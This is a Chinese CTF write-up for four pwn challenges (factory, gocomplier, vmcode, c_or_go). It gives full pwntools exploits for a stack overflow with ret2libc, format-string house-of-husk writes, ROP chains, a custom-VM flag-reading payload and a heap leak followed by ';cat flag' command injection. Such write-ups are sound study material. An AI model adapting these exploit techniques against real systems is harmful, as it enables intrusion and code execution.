factory
=======

- 题目内容如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-2bc6817321a90a3420f0d19cf6b26603f923456d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-38dc9ce9a31d7963497c8670f49c9df53f6a19c7.png)

- 没细看根本没有看出来漏洞，好像就是输入n，然后用alloca来调整栈空间，把数据读到栈上，然后printf打印这些值的和
- 但是注意到一个很奇怪的地方 v0 = 0x10  *((4*  n + 0x17) / 0x10uLL); 为什么v0不是8\*n，64位条件下，栈应该是8字节对齐
- 计算发现一些问题  
    size不严格。因此n=0x28时，实际上应该时alloca(0x140)，但这样计算只有0xb0，因此有溢出

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-783b4e9756d20efd84e92e24378c25c775135b9f.png)

- 因此有如下利用思路

这里的栈溢出可以覆盖到buf和i的值

第一个思路是覆盖buf为一个任意地址，那么就可以任意地址写任意值，但是这里无法控制返回地址，所以放弃这个思路。

第二个思路就是这个覆盖会先覆盖到i的值，再覆盖到buf的值，所以可以覆盖i为一个特别的值，跳过对buf的覆盖，这样就可以通过栈溢出覆盖到返回地址，进而就行ret2libc就行,更具体地可以看exp中的注释

- exp

```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
# p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x4013D2')
p=remote('1.95.81.93',57777)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc 

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *0x401402')
    pause()

# dbg()
p.sendlineafter("How many factorys do you want to build: ",str(0x28))

for i in range(0x16):
    p.sendlineafter(f"factory{i+1}",str(0x16))

#i
p.sendlineafter(f"factory{0x17}",str(0x1d-1))

#ret_addr
pop_rdi=0x401563
ret=0x000000000040101a
puts=0x4010B0
puts_got=0x404018
vuln=0x401303
p.sendlineafter(f"factory{30}",str(pop_rdi))
p.sendlineafter(f"factory{31}",str(puts_got))
p.sendlineafter(f"factory{32}",str(puts))
p.sendlineafter(f"factory{33}",str(vuln))
for i in range(0x28-33):
    p.sendlineafter(f"factory",str(0))

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']
bin_addr = libcbase + next(libc.search(b'/bin/sh'))

for i in range(0x16):
    p.sendlineafter(f"factory{i+1}",str(0x16))

#i
p.sendlineafter(f"factory{0x17}",str(0x1d-1))

#ret_addr
p.sendlineafter(f"factory{30}",str(pop_rdi))
p.sendlineafter(f"factory{31}",str(bin_addr))
p.sendlineafter(f"factory{32}",str(ret))
p.sendlineafter(f"factory{33}",str(system_addr))

for i in range(0x28-33):
    p.sendlineafter(f"factory",str(0))

p.interactive()
```

gocomplier
==========

自己的解法
-----

这里是直接用的一个github项目进行的改编 <https://github.com/wa-lang/ugo>

µGo 是迷你Go语言玩具版本，只保留最基本的int数据类型、变量定义和函数、分支和循环等最基本的特性。µGo 有以下的关键字：var、func、if、for、return。此外有一个int内置的数据类型

先分析server.py这个文件，这样我们可以知道怎么进行的交互

```python
#! /usr/bin/python3
import os
import sys
import subprocess
from threading import Thread
from shutil import copy
import uuid

def socket_print(string):
    print("=====", string, flush=True)

def run_challenge(filename):
    socket_print("start complete!")
    try: 
        cmd = "./ir2bin.sh"
        subprocess.run(cmd, shell=True, timeout=60)
    except subprocess.CalledProcessError as e:
        socket_print("stopping")
        clean_file(filename)
        pass

    socket_print("run binary")
    try: 
        subprocess.run("./hello", shell=True, timeout=60)
    except subprocess.CalledProcessError as e:
        socket_print("stopping")
        clean_file(filename)
        pass

def get_filename():
    return "./tmp/{}".format(uuid.uuid4().hex)

def clean_file(filename):
    socket_print("cleaning")
    subprocess.run("rm -r ../../"+filename, shell=True, timeout=60)

def mkdir(path):
    folder = os.path.exists(path)
    if not folder:                  
        os.makedirs(path)          
    else:
        socket_print("There is this folder!")

def input_code(filename):
    current_directory = os.getcwd()
    new_directory = current_directory + "/" + filename
    os.chdir(new_directory)
    socket_print("current: " + current_directory)
    socket_print("new: " + new_directory)

    with open('./hello.ugo', 'w') as file:
        print("input code: ")
        print("\tinput \"end\" to stop")
        while True:
            line = input()
            if line[:3] != "end": 
                file.write(line+"\n")
            else:
                break

def copy_file(filename):
    mkdir(filename)
    copy("/home/ctf/ugo", filename+"/ugo")
    copy("/home/ctf/hello.ugo", filename+"/hello.ugo")
    copy("/home/ctf/ir2bin.sh", filename+"/ir2bin.sh")

def check(filename):
    while True:
        if sys.stdout.closed:
            clean_file(filename)
            socket_print("Cleaned up directory:")

def main():
    #filename为./tmp/uuid.uuid4().hex 这种形式
    filename = get_filename()
    print("Working path: "+filename)
    Thread(target=check,args=filename)
    #创建文件夹filename，再把ugo,hello.ugo,ir2bin.sh这个几个文件复制到这个Working path
    copy_file(filename)
    #用户的输入会存到hello.ugo文件中，输入以end字符作为终止
    input_code(filename)
    #运行ir2bin.sh，再运行./hello文件
    run_challenge(filename)
    #清理Working path环境
    clean_file(filename)

if __name__ == "__main__":
    main()
```

ir2bin.sh,直接运行ugo会把当前目录下hello.ugo变成hello.ll文件，ir2bin.sh就是把hello.ugo编译链接成一个可执行文件hello

```bash
#!/bin/sh

./ugo
llvm-as hello.ll -o hello.bc
llc hello.bc -o hello.s
as -o hello.o hello.s
gcc -no-pie -static hello.o -o hello
rm hello.bc hello.s hello.o
```

针对上述的分析，就知道是我们用户自己输入code然后被编译链接运行，如果能直接getshell，那么就打通了

那么最后就是分析ugo这个文件了，看看code有什么限制。在github\_com\_klang\_ugo\_parser\_\_ptr\_Parser\_parseFile函数中看到了限制

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-84c891287e147645165b3ad1767d2388f5220414.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-641705cc210e9786f8b05675125e858e9fc1eb3f.png)

只能使用printf和write函数，那么就可以想到是格式化字符串漏洞了，不过由于ir2bin.sh是静态链接，同时是no pie,所以这个格式化字符串很有意思，因为是利用静态链接里面的gadget，在函数运行的过程中利用格式化字符串覆盖自己函数的返回地址，而且途中用户是不可以进行输入的。

这里首先思考如何覆盖返回地址，虽然随便利用格式化字符串，但是有个问题。**就是利用%p泄露出来的东西我们不像平时打格式化字符串那样可以交互，导致泄露了我们也无法存到变量中。**  
所以根本覆盖不了返回地址，只能想是否可以打其他的方式，比如exit函数等类似的ogg

最后想到是可以利用**house of husk**，因为有printf函数，只要覆盖**printf\_function\_table不为0，覆盖**printf\_arginfo\_table为一个地址，就可以执行\_\_printf\_arginfo\_table\[spec\]​的函数  
但是这还不够，**因为是静态链接的，没有像libc.so.6中有ogg可以用，所以必须ROP**  
显然这里要栈迁移了，常见的栈迁移利用方式是leave;ret或者setcontext，但是显然这里行不通，**因为栈地址都无法泄露**

这里思路就卡住了，卡了很久，最后想着随便找找和rsp相关的gadget，利用了如下指令 ROPgadget --binary hello | grep "add rsp.\*"

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b1b0fc266227465f086e223bcb1cf31593fa6d19.png)

可能有人会疑问为什么会找到这个**add rsp, 0x1018 ; ret这个如此奇怪的gadget，这里是动调看出来的结果，发现每次执行house of husk那个链的时候，栈情况总是差main函数超过0x1000的偏移**

这里我们就可以这样布置，先把ROP写到栈上，然后通过house of husk执行add rsp,0x1018;ret，然后执行栈上ROP，就可以getshell,这里格式化字符串也很折磨，**因为不让连续出现两个%,否则ugo执行的时候就会报错**，只能手动算有多少个a，然后输入

这里还有个地方要注意，**专门定义了一个my\_func()在main中调用，这也是动调的时候发现的**，只有这样add rsp,0x1018;ret才能到正确的位置进行ROP，**因为这里栈里面的偏移都是相对的，所以只能通过在main中调用另一个函数的方式来进行调整栈结构**

可以看到这里**printf\_arginfo\_table存的bss地址，bss\[spec\]存着add rsp,0x1018;ret地址**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-faaf26356e22b76a0456a1952cbd61024f647534.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f9f946d5497aeb68b19c09f77f190b8c5b011842.png)

执行完add rsp,0x1018后，**ret到的地址是个pop\_rbx，实际上它是pop4 ;ret，通过pop调整rsp指向最后指向我们布置的ROP，最后getshell**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e370bce1b77b2622fc9f3fdb45c79d5136a48f0c.png)

```go
package main

func my_func() {

    var u4 int =0
    var u3 int =0
    var u2 int =0
    var u1 int =0

    var u0 int =0
    var pop4 int =0x47d932

    // 0x4cd7e8 <__printf_function_table> 
    // 0x4cdc30 <__printf_arginfo_table>
    var a int =0
    var printf_function_table int = 0x4cd7e8

    var b0 int =0
    var printf_arginfo_table0  int = 0x4cdc30 

    var b1 int =0
    var printf_arginfo_table1  int = 0x4cdc31 

    var b2 int =0
    var printf_arginfo_table2  int = 0x4cdc32 

    //add_rsp
    var d0 int =0
    var bss0_ int = 0x4c87c0
    var d1 int =0
    var bss1_ int = 0x4c87c1
    var d2 int =0
    var bss2_ int = 0x4c87c2

    // sh_addr=0x4c88d8 
    var f0 int =0
    var bss0___ int = 0x4c88d8 
    var f1 int =0
    var bss1___ int = 0x4c88d9
    var f2 int =0
    var bss2___ int = 0x4c88da
    var f3 int =0
    var bss3___ int = 0x4c88db 
    var f4 int =0
    var bss4___ int = 0x4c88dc
    var f5 int =0
    var bss5___ int = 0x4c88dd 
    var f6 int =0
    var bss6___ int = 0x4c88de

    //bss_start= 0x4c87c0-0x398 =0x4c8428

    //printf_arginfo_table0 
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%18$hhn")
    //printf_arginfo_table1
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%17$hhn")
    //printf_arginfo_table2
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%16$hhn")

    //bss add_rsp_ret=0x4514ab
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%15$hhn")
    printf("aaaaaaaaaaaaaaaaaaaa%14$hhn")
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%13$hhn")

    //  2f 62 69 6e 2f 73 68
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12$hhn")
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%11$hhn")
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%10$hhn")
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%9$hhn")
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%8$hhn")
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%7$hhn")
    printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%6$hhn")

    // write printf_function_table 要在最后修改
    printf("aaaa%19$hhn") 

    return 0
}

func main() {

     var l12 int =0
    var syscall int =0x401d94

    var l11 int =0
    var rax int =0x3b

    var l10 int =0
    var pop_rax int =0x40191a

    var l8 int =0
    var l9 int =0

    var l3 int =0
    var l4 int =0

    var l5 int = 0
    var pop_rdx_rbx int =0x4859cb 

    var l6 int =0
    var l7 int =0

    var l2 int =0
    var pop_rsi int =0x40a04e

    var l1 int =0
    var sh_addr int =0x4c88d8

    var l0 int =0
    var pop_rdi int=0x401fdf

    my_func()

    printf("%s")

    return 0
}
```

官方WP
----

其实可以发现，题目给的一个example.ugo给了提示，直接运行它就会segmentfault，所以官方题解也是这样

**string 类型的错误处理，通过调用返回类型为 string 的函数来构造栈溢出，最后注入ROP链**

- exp

```python
from pwn import *
from string import Template

p = remote("127.0.0.1",2102)

code = """
package main

func add() string{
    return "$str"
}

func main() int {
    var b string = "bbbbbbb"
    var a string = add()
    a = "$payload"
    return 0x3b
}
"""

template = Template(code)
payload  = p64(0x498010)*8
payload += p64(0x0000000000409ebe)+p64(0)
payload += p64(0x000000000047eceb)+p64(0)+p64(0)
payload += p64(0x0000000000401c04)
key = ''.join(['\\x{:02X}'.format(b) for b in payload])

result = template.substitute(payload=key,str="/bin/sh\x00"+"a"*0x1f8)

print(key)
print(result)

p.sendlineafter("stop",result+"end")
p.interactive()
```

- result的值

```go
package main

func add() string{
    return "/bin/sh\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
}

func main() int {
    var b string = "bbbbbbb"
    var a string = add()
    a = "\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\x10\x80\x49\x00\x00\x00\x00\x00\xBE\x9E\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xEB\xEC\x47\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x1C\x40\x00\x00\x00\x00\x00"
    return 0x3b
}
```

最终的ida反汇编结果如图所示,rsp+0x48处存的就是返回地址，可以看到给a的赋值全部都存到retaddr开始的地方，这里可以写上ROP。同时设置返回值为0x3b，这样就设置了rax=0x3b，而rdi的值是一开始add函数中/bin/sh的地址

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-480f94a0909b41551a747ce3aa2af216b7a4a6ae.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b374fe711e18a43ece4dd8d24bd83cd035ebf751.png)

而且注意到var b string = "bbbbbbb"不能删去，因为这里会根据这个调整栈布局，估计出题人也是边写exp边动调看栈布局进而修改exp

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8a5a01e1b9945bf2447ed6999b4aa99e4e09859b.png)

vmcode
======

[参考文章](https://www.bilibili.com/read/cv39270682/)

sandbox后是这样一段代码,可以看到是从code段每次读取一个字节(此时rsi相当于ip)，然后减去0x21，如果这个值大于等于0则进行下面的处理

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-adce0b864490649882d0782a3173f7a2d0e65c75.png)

关与0x1257这一处代码看着比较奇怪，动调一下看看。**可以看到pop rcx时刚好是0x123a处的代码**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-9c3a1bf22de42db2133ab182814795578b0fbe57.png)

可以看到**通过从offset里面取出来两个字节存到rax中，然后ret到0x123a+rax处的代码进行执行**，那么接下来的重点显然是分析offset存的都是什么

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ac920d534ba6573528ce54eb3167e90af1e0ffa4.png)

可以看到offset每两个字节存的值都是递增的，**那么看到首地址是0x123a+0x3a=0x1274,这也是opcode=0x21处的代码，剩下的都是顺延就行**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c6dbec09b2d591806a35cca73f11bc1949e2aebd.png)

接下来就看一开始怎么输出shellcode这个字符串以及怎么读opcode，在0x1417打断点，因为只有这里有syscall

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1584f2a561b6fbaf36d06b38602dbdb310423d45.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c9c04cc788d9c43c21b4c0a179962562246f065b.png)

需要注意的是这一处都属于0x2c处的代码

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f34c2029ee6bb686453c0bfa8b1ea0790352807b.png)

最后逆向出来的结果如下

```python
'''
rdi相当于sp,rsi相当于ip
0x21  push ip，ip=[ip]+ip+2  call指令
0x22 pop ip
0x23 xor [sp-0x10],[sp-0x8],sp-=1
0x24 swap [sp-8],[sp-18h]
0x25 swap [sp-8],[sp-10h]
0x26  push imm(32字节)  
0x27 将栈上第一个参数由单字节类型扩展为8字节类型 
0x28 sp-=1
0x29 shr [sp-8],8
0x2a push [sp-8]
0x2b shl [sp-8],8
0x2c pop rax,判断rax的值是否为0，不为0跳转到loc_138C，此时的ip=[ip]+ip+2  jmp指令
0x2d ror [sp-8],[sp-10h];mov [sp-10h],[sp-8];sp-=1
0x2e rol [sp-8],[sp-10h];mov [sp-10h],[sp-8];sp-=1
0x2f and [sp-8],[sp-10h];mov [sp-10h],[sp-8];sp-=1

0x30 比较重要
push    rsi
lea     rbx, stack
mov     rax, [rbx+rdi*8-8]
mov     rsi, [rbx+rdi*8-18h]
mov     rdx, [rbx+rdi*8-20h]
push    rdi
mov     rdi, [rbx+rdi*8-10h]
syscall              
pop     rdi
sub     rdi, 3
pop     rsi
mov     [rbx+rdi*8-8],                                                           
retn

0x31 push sp
0x32 push ip 
0x33 exit
'''
```

**这里其实还有个难题是read和write的buf要怎么设置，这里用到了一种方法push rsp，然后shr再shl把rsp低8位清0，这样就不影响栈上原本的数据**

- exp

```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *$rebase(0x1417)')
# p=remote('192.168.18.22',9999)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc 

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *$rebase(0x109B)')
    pause()

def call(offset):
    return p8(0x21) + p16(offset)

def ret():
    return p8(0x22)

def xor():
    return p8(0x23)

def swap02():
    return p8(0x24) 

def swap01():
    return p8(0x25)

def push_imm(imm):
    return p8(0x26) + p32(imm)

def extand_byte():
    return p8(0x27)

def pop():
    return p8(0x28)

def shr():
    return p8(0x29)

def dup():
    return p8(0x2a)

def shl():
    return p8(0x2b)

def jmp(offset):
    return p8(0x2c) + p16(offset)

def ror():
    return p8(0x2d)

def rol():
    return p8(0x2e)

def and_():
    return p8(0x2f)

def syscall():
    return p8(0x30)

def push_sp():
    return p8(0x31)

def push_ip():
    return p8(0x32)

def exit_():
    return p8(0x33)

payload = flat([
    # open("/flag", 0)
    push_imm(0x67616c66), # "/flag"
    push_sp(),
    push_imm(0x0),
    swap01(),
    push_imm(0x2),
    syscall(),

    # read(3, buf, 0x100)
    push_imm(0x100),
    push_sp(),
    shr(),
    shl(),
    push_imm(0x3),
    push_imm(0x0),
    syscall(),

    # write(1, buf, 0x100)
    push_imm(0x100),
    push_sp(),
    shr(),
    shl(),
    push_imm(0x1),
    push_imm(0x1),
    syscall(),
])
p.sendline(payload)

p.interactive()
```

其实一开始复现这个题很迷茫，觉得自己RE能力不行做不出来，但是慢慢地顺着程序逻辑理清楚流程，慢慢的逆向还是做出来了，总之这种题就是要有耐心，慢慢来。

c\_or\_go
=========

一道go的逆向，顺着程序逻辑逆向发现有如下几个部分：

读取数据并对Json数据进行Unmarshal

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e0475729a6e7564b3731a0ca542ac4704af4dfc9.png)

不同的opcode对应不同的操作0-NewUser,1-ShowUser,2-DeleteUser,-1对应一个很奇怪的函数，这里一开始先不做分析

user\_controller就和普通菜单堆里面的chunklist比较像,find\_user是ShowUser和DeleteUser中都会先调用的函数，其功能就是找到对应的存储块,注意这里的strcmp函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-83a1fed4e46217f96d501ef0062b4de087186bca.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-69961a6b74f418927ade3893c4fdbed60a371b17.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-85ec6cede15929dbdaf0d4ac84a38bba12178379.png)

NewUser函数开辟了很多空间，有的在堆块上，有的是mmap出来的，整体比较乱，不是很好具体分析。但是我们可以把他类比成普通菜单堆中的add函数，还是能正常地申请堆块

看完大致功能，先解决如何交互的问题。有Json肯定先搜索字符串看看都是什么样的键值对要求.看到如下字符串，同时看到下面有两个base64解码的操作，直接就去试试看能不能过交互，发现是可以的

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7c9f7a589f959b3119b934cbceed5cf15ece397f.png)

**对我个人而言，我觉得过这种交互就像是渗透测试一样，因为有的反汇编的东西太难以阅读分析，只能去试，所以遇到json最好先通过string看看有什么，如果直接看到的不行那就再跟进看看有没有相关字符串**

那么接下来分析opcode为-1那部分函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-956776da235cbb71f55314b8c98ac6ab1ae21a31.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6b1199307a3f9dd9c0e0f21f11e2078636f31986.png)

main\_CheckKey就是检查输入的是否和&amp;puts地址一样，其返回值是个bool类型，如果相同则进行main\_Logs的调用

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d131ccc7599755bf96dac2cc97c82acadaedf434.png)

main\_Logs函数进行拼接字符串，然后执行指令

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-132f275df27a3d6a39af3502617e4a1bf5cd12b7.png)

**但是笔者在这里并没有看出命令执行到底体现在哪，虽然题目给了很明显的backdoor是这个，猜也能猜到这里是想通过命令执行的漏洞来cat flag，但是在我逆向分析的过程中，并没有看出来这里的漏洞。**  
**可能这种题目就是要靠一点猜吧，题目都给了直接的后门，而且后门还有利用条件(比较&amp;puts值)，所以出题人肯定想的是让你满足条件利用后门**

最后的攻击也比较简单了，直接利用malloc\_consolidate合并fastbin然后泄露libcbase得到puts函数地址，利用后门进行命令执行cat flag

- exp

```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
import base64
import json
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x4D9249')
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc

def dbg():
    gdb.attach(p,'b *0x4D8E12')  
    pause()

def check(name, content, size):

    pay = {
        "task_type": -1,
        #b'O2NhdCBmbGFn' O2NhdCBmbGFn
        "username": base64.b64encode(name).decode(),
        "content": base64.b64encode(content).decode(),
        "size": size,
    }
    return pay

def add(name, content, size):
    pay = {
        "task_type": 0,
        "username": base64.b64encode(name).decode(),
        "content": base64.b64encode(content).decode(),
        "size": size,
    }
    return pay

def delete(name, size=0):
    pay = {
        "task_type": 2,
        "userName": base64.b64encode(name).decode(),
        "size": size,
    }
    return pay

def show(name, size=0):
    pay = {
        "task_type": 1,
        "username": base64.b64encode(name).decode(),
        "size": size,
    }
    return pay

def add_wrap(name, content, size):
    p.sendlineafter(
        "input your tasks",
        json.dumps([add(name, content, size)]),
    )

def delete_wrap(name):
    p.sendlineafter(
        "input your tasks",
        json.dumps([delete(name)]),
    )

def show_wrap(name):
    p.sendlineafter(
        "input your tasks",
        json.dumps([show(name)]),
    )

# dbg()
for i in range(9):
    add_wrap(b"qaq", b"q" * 0x30, 0x60) 
for i in range(9):
    delete_wrap(b"qaq")

#触发malloc_consolidate
add_wrap(b"qaq", b"q" * 0x410, 0x30)
add_wrap(b"target", b"q", 0x60)
show_wrap(b"target")
p.recvuntil("user content:\n\n")
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x1ecc71 #q 0x71

print("libc", hex(libc.address))

p.sendlineafter(
    "input your tasks",
    json.dumps(
        [check(hex(libc.sym["puts"]).encode() + b"\x00", b";cat flag", 0x10)] 
    ),
)
p.interactive()
```